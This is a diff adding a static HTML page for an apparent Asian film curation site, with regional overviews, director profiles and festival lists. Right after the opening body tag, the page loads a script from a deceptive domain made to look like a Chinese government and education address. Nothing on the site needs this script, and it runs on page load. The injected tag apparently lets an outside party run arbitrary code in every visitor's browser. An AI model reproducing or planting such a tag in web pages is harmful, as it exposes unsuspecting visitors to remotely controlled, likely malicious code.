@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>亚洲影廊电影网 - 亚洲电影策展与片单</title>
+<meta name="description" content="亚洲影廊电影网(yazhouyinglangdianyingwang-h5)策展中日韩、东南亚、南亚与中亚电影：作者导演、电影节片单、修复经典、青春线与亚洲新浪潮，移动端自适应，必应收录友好。">
+<meta name="keywords" content="亚洲影廊电影网, 亚洲电影, 日本电影, 韩国电影, 华语电影, 东南亚电影, 电影节片单, 作者导演">
+<meta name="author" content="亚洲影廊电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://yazhouyinglangdianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --paper:#f4efe6;
+  --paper2:#ece4d6;
+  --ink:#23211c;
+  --soft:#5b5547;
+  --seal:#b23b2e;
+  --jade:#2f6f5e;
+  --gold:#b8893b;
+  --line:#d8cdb8;
+  --film:#15140f;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","Noto Serif CJK SC","PingFang SC",serif;
+  background:
+    repeating-linear-gradient(90deg,transparent 0 22px,rgba(0,0,0,.015) 22px 24px),
+    var(--paper);
+  color:var(--ink);
+  line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 胶片条 */
+.film-bar{
+  background:var(--film);
+  color:#e9e2d2;
+  text-align:center;
+  font-size:11px;
+  letter-spacing:3px;
+  padding:6px 10px;
+  font-family:Arial,sans-serif;
+  border-bottom:3px solid var(--seal);
+}
+
+/* 头部 */
+.header{
+  max-width:1120px;margin:0 auto;
+  padding:28px 20px 16px;
+  display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;
+}
+.brand{display:flex;align-items:center;gap:16px}
+.seal{
+  width:56px;height:56px;border-radius:8px;
+  background:var(--seal);color:#fff;
+  display:flex;align-items:center;justify-content:center;
+  font-size:24px;font-weight:800;
+  box-shadow:0 4px 14px rgba(178,59,46,.25);
+  transform:rotate(-4deg);
+}
+.brand h1{font-size:26px;letter-spacing:3px}
+.brand .en{font-family:Arial,sans-serif;font-size:11px;color:var(--soft);letter-spacing:2px}
+.header-search{flex:1;max-width:300px}
+.header-search form{display:flex;height:40px;border:1px solid var(--line);border-radius:20px;overflow:hidden;background:#fbf8f1}
+.header-search input{flex:1;border:none;outline:none;background:transparent;padding:0 16px;font-size:13px}
+.header-search button{border:none;background:var(--ink);color:#f4efe6;padding:0 18px;font-size:13px;cursor:pointer}
+
+/* 导航 */
+.nav{max-width:1120px;margin:0 auto;padding:0 20px;display:flex;gap:10px;flex-wrap:wrap}
+.nav a{padding:8px 16px;border:1px solid var(--line);border-radius:20px;font-size:13px;color:var(--soft);background:#fbf8f1}
+.nav a:hover,.nav a.active{background:var(--seal);color:#fff;border-color:var(--seal)}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:20px 20px 30px}
+
+/* 策展横幅 */
+.curator{
+  position:relative;
+  background:linear-gradient(135deg,#2a2722,#3c372e);
+  color:#f1e9d8;
+  border-radius:14px;
+  padding:28px 26px;
+  overflow:hidden;
+  border-left:6px solid var(--gold);
+  margin-bottom:28px;
+}
+.curator::after{content:"🎞️";position:absolute;right:12px;bottom:-16px;font-size:130px;opacity:.07}
+.curator .kicker{font-family:Arial,sans-serif;font-size:12px;color:var(--gold);letter-spacing:3px}
+.curator h2{font-size:25px;margin:6px 0 8px}
+.curator p{color:#cfc6b2;max-width:640px;font-size:14px}
+.curator .tags{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.curator .tags span{padding:4px 12px;border:1px solid #5b5547;border-radius:20px;font-size:12px;color:var(--gold)}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;border-bottom:2px solid var(--line);padding-bottom:8px}
+.s-head .no{width:30px;height:30px;border-radius:6px;background:var(--ink);color:#f4efe6;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px}
+.s-head h3{font-size:18px;letter-spacing:1px}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--seal);font-family:Arial,sans-serif}
+
+/* 栏目一：地区策展 */
+.regions{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.region-card{
+  background:#fbf8f1;border:1px solid var(--line);
+  border-top:3px solid var(--jade);
+  border-radius:12px;padding:18px;transition:transform .25s;
+}
+.region-card:hover{transform:translateY(-4px)}
+.region-card .flag{font-size:30px}
+.region-card h4{font-size:16px;margin:6px 0}
+.region-card .meta{font-size:12px;color:var(--soft);font-family:Arial,sans-serif;margin-bottom:8px}
+.region-card p{font-size:13px;color:#4a4438}
+.region-card .chips{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}
+.region-card .chips em{font-style:normal;font-size:11px;padding:2px 9px;border:1px solid var(--line);border-radius:10px;color:var(--jade)}
+
+/* 栏目二：作者导演 */
+.auteurs{background:#fbf8f1;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.auteur-row{display:flex;align-items:center;gap:14px;padding:14px 16px;border-bottom:1px dashed var(--line)}
+.auteur-row:last-child{border-bottom:none}
+.avatar{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,var(--gold),var(--seal));color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;flex-shrink:0}
+.auteur-info{flex:1}
+.auteur-info h4{font-size:15px}
+.auteur-info p{font-size:11px;color:var(--soft);font-family:Arial,sans-serif}
+.auteur-era{font-family:Arial,sans-serif;font-size:12px;color:var(--seal);flex-shrink:0}
+
+/* 栏目三：电影节片单 横向 */
+.fest-scroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.fest-card{scroll-snap-align:start;flex:0 0 220px;background:#fbf8f1;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.fest-top{height:80px;display:flex;align-items:center;justify-content:center;font-size:34px;background:linear-gradient(135deg,#2f6f5e,#1f4d40);color:#eaf6f0}
+.fest-card:nth-child(2) .fest-top{background:linear-gradient(135deg,#b23b2e,#7d251c)}
+.fest-card:nth-child(3) .fest-top{background:linear-gradient(135deg,#b8893b,#8a6321)}
+.fest-card:nth-child(4) .fest-top{background:linear-gradient(135deg,#3a4a6b,#243352)}
+.fest-card:nth-child(5) .fest-top{background:linear-gradient(135deg,#7a5ea8,#4f3b73)}
+.fest-body{padding:12px}
+.fest-body h4{font-size:14px;margin-bottom:4px}
+.fest-body p{font-size:11px;color:var(--soft);line-height:1.5}
+
+/* 栏目四：关于 */
+.about{background:#2a2722;color:#ece2cf;border-radius:12px;padding:24px;display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:38px}
+.about h3{font-size:17px;color:var(--gold);margin-bottom:6px}
+.about p{font-size:13px;color:#d3c9b4;max-width:660px}
+.about .url{margin-top:8px;font-family:Arial,sans-serif;font-size:12px;color:var(--gold)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:3px double var(--line);padding:26px 20px 38px;text-align:center;color:var(--soft);font-size:12px;font-family:Arial,sans-serif}
+.footer a{color:var(--seal)}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{color:var(--soft)}
+.footer .fn a:hover{color:var(--ink)}
+
+@media(max-width:860px){.regions{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .brand h1{font-size:20px}
+  .seal{width:46px;height:46px;font-size:20px}
+  .header-search{display:none}
+  .nav a{padding:6px 12px;font-size:12px}
+  .curator{padding:20px 16px}
+  .curator h2{font-size:20px}
+  .main{padding:14px 16px 24px}
+  .regions{grid-template-columns:1fr}
+  .auteur-row{flex-wrap:wrap;gap:10px}
+  .auteur-era{width:100%}
+  .fest-card{flex-basis:80%}
+  .about{padding:18px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="film-bar">🎞 亚洲影廊电影网 · 亚洲电影策展站 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="brand">
+    <div class="seal">亚</div>
+    <div>
+      <h1>亚洲影廊电影网</h1>
+      <div class="en">yazhouyinglangdianyingwang-h5 · Asian Film Gallery</div>
+    </div>
+  </div>
+  <div class="header-search">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜 是枝裕和 / 奉俊昊 / 陈英雄...">
+      <button type="submit">策展</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">影廊首页</a>
+  <a href="#">日本电影</a>
+  <a href="#">韩国电影</a>
+  <a href="#">华语电影</a>
+  <a href="#">东南亚电影</a>
+  <a href="#">南亚/中亚</a>
+  <a href="#">作者导演</a>
+  <a href="#">电影节片单</a>
+  <a href="#">关于影廊</a>
+</nav>
+
+<div class="main">
+
+  <!-- 策展横幅 -->
+  <section class="curator">
+    <div class="kicker">CURATED ASIAN CINEMA</div>
+    <h2>不追热搜，只挂好片子：从东京到釜山，从台北到清迈</h2>
+    <p>亚洲影廊把亚洲电影当展览做——作者脉络、地区气质、电影节获奖线、修复经典与新浪潮，一屏一展区。所有内页用 # 占位，不提供盗版下载。</p>
+    <div class="tags">
+      <span>作者导演</span><span>电影节</span><span>修复经典</span><span>青春线</span><span>新浪潮</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="regions">
+    <div class="s-head"><span class="no">01</span><h3>地区策展 · 亚洲地图</h3><a class="more" href="#">全地区 #</a></div>
+    <div class="regions">
+      <article class="region-card">
+        <div class="flag">🇯🇵</div>
+        <h4>日本电影</h4>
+        <div class="meta">Tokyo / Kyoto / Okinawa</div>
+        <p>家庭留白、青春物哀、动画造梦。是枝、今敏、沟口健二到滨口龙介。</p>
+        <div class="chips"><em>家庭</em><em>物哀</em><em>动画</em></div>
+      </article>
+      <article class="region-card">
+        <div class="flag">🇰🇷</div>
+        <h4>韩国电影</h4>
+        <div class="meta">Seoul / Busan / Jeju</div>
+        <p>类型片发动机：奉俊昊、朴赞郁、李沧东，社会派与惊悚线都狠。</p>
+        <div class="chips"><em>类型</em><em>社会</em><em>惊悚</em></div>
+      </article>
+      <article class="region-card">
+        <div class="flag">🇨🇳</div>
+        <h4>华语电影</h4>
+        <div class="meta">台北 / 香港 / 上海 / 西南</div>
+        <p>侯孝贤的远镜、王家卫的霓虹、杨德昌的都市、毕赣的南方长镜。</p>
+        <div class="chips"><em>文艺</em><em>都市</em><em>方言</em></div>
+      </article>
+      <article class="region-card">
+        <div class="flag">🇹🇭</div>
+        <h4>东南亚电影</h4>
+        <div class="meta">Bangkok / Hanoi / Jakarta</div>
+        <p>阿彼察邦的雨林、陈英雄的越南、印尼政治惊悚与泰国同志线。</p>
+        <div class="chips"><em>雨林</em><em>慢电影</em><em>同志</em></div>
+      </article>
+      <article class="region-card">
+        <div class="flag">🇮🇳</div>
+        <h4>南亚电影</h4>
+        <div class="meta">Mumbai / Kolkata / Colombo</div>
+        <p>不只有宝莱坞：孟加拉的雷伊、印度新浪潮、斯里兰卡战后片。</p>
+        <div class="chips"><em>新浪潮</em><em>音乐</em><em>阶级</em></div>
+      </article>
+      <article class="region-card">
+        <div class="flag">🐫</div>
+        <h4>中亚与西亚</h4>
+        <div class="meta">Iran / Kazakhstan / Uzbekistan</div>
+        <p>阿巴斯式儿童视点、哈萨克斯坦草原长镜、中亚边境与游牧现代。</p>
+        <div class="chips"><em>儿童</em><em>边境</em><em>诗意</em></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="auteurs">
+    <div class="s-head"><span class="no">02</span><h3>作者导演 · 亚洲谱系</h3><a class="more" href="#">完整谱系 #</a></div>
+    <div class="auteurs">
+      <div class="auteur-row">
+        <div class="avatar">是</div>
+        <div class="auteur-info"><h4>是枝裕和</h4><p>日本 · 家庭 / 留白 / 日常神性</p></div>
+        <div class="auteur-era">1995—</div>
+      </div>
+      <div class="auteur-row">
+        <div class="avatar">奉</div>
+        <div class="auteur-info"><h4>奉俊昊</h4><p>韩国 · 类型包裹社会批判</p></div>
+        <div class="auteur-era">2000—</div>
+      </div>
+      <div class="auteur-row">
+        <div class="avatar">侯</div>
+        <div class="auteur-info"><h4>侯孝贤</h4><p>台湾 · 长镜 / 框中取景 / 历史余温</p></div>
+        <div class="auteur-era">1980—2015</div>
+      </div>
+      <div class="auteur-row">
+        <div class="avatar">阿</div>
+        <div class="auteur-info"><h4>阿彼察邦</h4><p>泰国 · 雨林 / 梦境 / 慢时间</p></div>
+        <div class="auteur-era">2000—</div>
+      </div>
+      <div class="auteur-row">
+        <div class="avatar">雷</div>
+        <div class="auteur-info"><h4>萨蒂亚吉特·雷伊</h4><p>印度 · 阿普三部曲 / 人文现实主义</p></div>
+        <div class="auteur-era">1950—1990</div>
+      </div>
+      <div class="auteur-row">
+        <div class="avatar">阿巴</div>
+        <div class="auteur-info"><h4>阿巴斯·基亚罗斯塔米</h4><p>伊朗 · 儿童视点 / 虚实边界</p></div>
+        <div class="auteur-era">1970—2010</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="fests">
+    <div class="s-head"><span class="no">03</span><h3>电影节片单 · 亚洲入选</h3><a class="more" href="#">更多影展 #</a></div>
+    <div class="fest-scroll">
+      <div class="fest-card"><div class="fest-top">🎬</div><div class="fest-body"><h4>戛纳系</h4><p>《寄生虫》《驾驶我的车》《花样年华》主竞赛线。</p></div></div>
+      <div class="fest-card"><div class="fest-top">🐉</div><div class="fest-body"><h4>柏林系</h4><p>《霸王别姬》《千里走单骑》与亚洲作者获奖脉络。</p></div></div>
+      <div class="fest-card"><div class="fest-top">🦁</div><div class="fest-body"><h4>威尼斯系</h4><p>《悲情城市》《水形物语》外的亚洲作者片单。</p></div></div>
+      <div class="fest-card"><div class="fest-top">🐳</div><div class="fest-body"><h4>釜山 / 东京</h4><p>新导演首作、亚洲独立片、青年线入口。</p></div></div>
+      <div class="fest-card"><div class="fest-top">🪷</div><div class="fest-body"><h4>上海 / 平遥</h4><p>华语新片、修复经典、作者回顾展。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">04</span><h3>关于亚洲影廊</h3></div>
+    <div class="about">
+      <div class="ico">🖼️</div>
+      <div>
+        <h3>把电影当展览挂起来</h3>
+        <p>亚洲影廊电影网（yazhouyinglangdianyingwang-h5）是亚洲电影策展/片单站：地区、作者、影展、修复经典四条线交叉排布。页面为单页静态结构，移动端自适应，内页用 # 占位，不托管未授权视频，正版播放平台另附外链。</p>
+        <div class="url">https://yazhouyinglangdianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 亚洲影廊电影网 | yazhouyinglangdianyingwang-h5</div>
+  <div>永久地址：<a href="https://yazhouyinglangdianyingwang-h5.github.io">https://yazhouyinglangdianyingwang-h5.github.io</a></div>
+  <div>本站为亚洲电影推荐/策展/片单整理站，不提供盗版资源下载。</div>
+  <div class="fn">
+    <a href="#">影廊</a><a href="#">日本</a><a href="#">韩国</a><a href="#">华语</a><a href="#">东南亚</a><a href="#">影展</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
